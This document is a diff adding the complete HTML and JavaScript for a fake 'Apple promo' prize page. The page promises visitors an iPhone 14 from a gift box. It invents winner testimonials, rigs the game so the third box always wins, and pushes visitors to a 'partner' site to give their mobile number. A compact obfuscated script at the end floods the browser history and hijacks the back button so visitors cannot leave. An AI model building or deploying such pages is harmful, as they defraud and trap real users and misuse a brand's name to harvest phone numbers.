@@ -1,0 +1,153 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<title>Congratulations!</title>
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+</head>
+<body>
+	<div class="wrapper">
+		<div class="header"><strong>Congratulations!</strong><br>Draw date: <span id="date"></span><br></div>
+		<div class="content">
+			<div class="client"><strong>Dear customer,</strong><br>Every day we select 7 lucky customers to receive a reward.
+			</div>
+			<div class="info">All you have to do is to choose the right gift box<br><strong>Find an iPhone 14</strong></div>
+			<div class="boxs">
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+			</div>
+			<div class="comments">
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/001.jpg">
+					</div>
+					<div class="comment_name">Imka</div>
+					<div class="comment_text">I was not sure if it was true or not, but I received my iPhone 14 today! Awesome!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>3 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/002.jpg">
+					</div>
+					<div class="comment_name">Elna</div>
+					<div class="comment_text">I've always wanted to win. And I was absolutely delighted when my prize was delivered this morning. Now I have a new phone!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>15 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/003.jpg">
+					</div>
+					<div class="comment_name">Amahle</div>
+					<div class="comment_text">This is the first time I tried my luck to win something. It feels so unreal when I realize I won it. IPhone 14 is an awesome prize, thank you!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>37 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/008.jpg">
+					</div>
+					<div class="comment_name">Lethabo</div>
+					<div class="comment_text">Thank you so much! I won iPhone 14!! For real!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>54 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/004.jpg">
+					</div>
+					<div class="comment_name">Annika</div>
+					<div class="comment_text">I am glad to share my story. I registered and left my phone number. Few hours later I received a call from manager about delivery of my prize! I am happy now!!!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>1 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/005.jpg">
+					</div>
+					<div class="comment_name">Ella</div>
+					<div class="comment_text">I don't know why I won just 14, can I have one more try to get ipad?</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>2 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/006.jpg">
+					</div>
+					<div class="comment_name">Kaya</div>
+					<div class="comment_text">Thank you, I won, I wish all my friends win too!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>2 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/007.jpg">
+					</div>
+					<div class="comment_name">Thabisa</div>
+					<div class="comment_text">I was going to buy the IPhone 11 but I won it here! New iPhone 14! Wow! Thank you!</div>
+					<div class="comment_info"><span>Like</span> · <span>Reply</span> · <span>4 hour</span></div>
+				</div>
+			</div>
+		</div>
+		<div class="footer">Apple promo</div>
+	</div>
+	<script src="./js/sweetalert2.all.min.js"></script>
+    <script src="./js/jquery.min.js"></script>
+	<script>
+	Swal.fire({
+	    title: 'Rewards event',
+	    html: "Congratulations, dear customer!<br><br>To thank you for your loyalty to us, we are giving you the chance to win an <strong>iPhone 14</strong><br><br>Open boxes to participate and win prizes!<br><br><strong>Good Luck!</strong>",
+	    confirmButtonText: 'OK',
+	    confirmButtonColor: '#ff0000',
+	});
+	function dialog1() {
+	    Swal.fire({
+	        text: 'Unfortunately, this box is empty. You still have (2) tries. Good luck!',
+	        confirmButtonText: 'OK',
+	        confirmButtonColor: '#ff0000',
+	        icon: 'success'
+	});
+	}
+	function dialog2() {
+	    Swal.fire({
+	        text: 'Unfortunately, this box is empty. You still have (1) try. Good luck!',
+	        confirmButtonText: 'OK',
+	        confirmButtonColor: '#ff0000',
+	        icon: 'success'
+	    });
+	}
+	function dialog3() {
+	    Swal.fire({
+	        imageUrl: 'img/iphone.jpg',
+	        html: '<strong>You may be a Winner of:</strong> <h2>iPhone 14</h2><br><h4>Next Steps:</h4><br>1. You\'ll be redirected to the partner\'s site<br>2. Enter your mobile number<br>3. Get your New iPhone 14',
+	        allowOutsideClick: false,
+	        showConfirmButton: false,
+	        footer: '<a href="#landing-url">Confirm</a>'
+	    });
+	}
+	i = 0;
+	$('.box').click(function () {
+	    i++;
+	    if (i == 1) {
+	        $(this).html('<img src="img/box_open.jpg">');
+	        $(dialog1()).load();
+	    }
+	    if (i == 2) {
+	        $(this).html('<img src="img/box_open.jpg">');
+	        $(dialog2()).load();
+	    }
+	    if (i == 3) {
+	        $(this).html('<img src="img/box_iphone.jpg">');
+	        $(dialog3()).load();
+	    }
+	});
+	var date = new Date().toLocaleDateString();
+	document.getElementById('date').innerHTML = date;
+	</script>
+	<script>!function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("#js-landing-url")}}catch(b){}}();</script>
+</body>
+</html>
